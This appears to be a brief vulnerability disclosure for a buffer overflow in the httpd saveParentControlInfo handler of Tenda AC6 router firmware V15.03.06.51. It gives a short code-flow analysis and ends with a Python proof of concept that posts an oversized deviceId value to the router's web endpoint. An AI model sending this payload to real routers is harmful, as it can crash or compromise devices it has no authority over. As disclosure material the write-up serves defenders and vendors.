# buffer overflow

## Tenda_AC6

version: V15.03.06.51

## Description:

There is a buffer overflow in httpd/saveParentControlInfo

## Source:

you may download it from : https://www.tendacn.com/download/detail-3794.html

## Analyse:


![](../Tenda_AC10/5.png)

get value from deviceName ,then call set_device_name

![](../Tenda_AC10/6.png)

if deviceName and deviceId are are not null,set_device_name send to mac_addr, call sprintf, cause buff overflow

## POC
```
url = "http://192.168.1.13/goform/saveParentControlInfo"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'deviceName': '1', 'deviceId': payload,'time':'1'})
``` 
